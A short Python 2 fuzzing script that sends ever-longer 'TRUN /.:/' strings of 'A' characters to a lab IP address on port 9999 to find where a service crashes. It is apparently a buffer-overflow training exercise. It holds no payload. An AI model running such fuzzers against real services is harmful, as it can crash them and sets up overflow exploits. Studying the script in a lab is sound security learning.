#!/usr/bin/python
import sys
import socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.11.23.92',9999))

		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()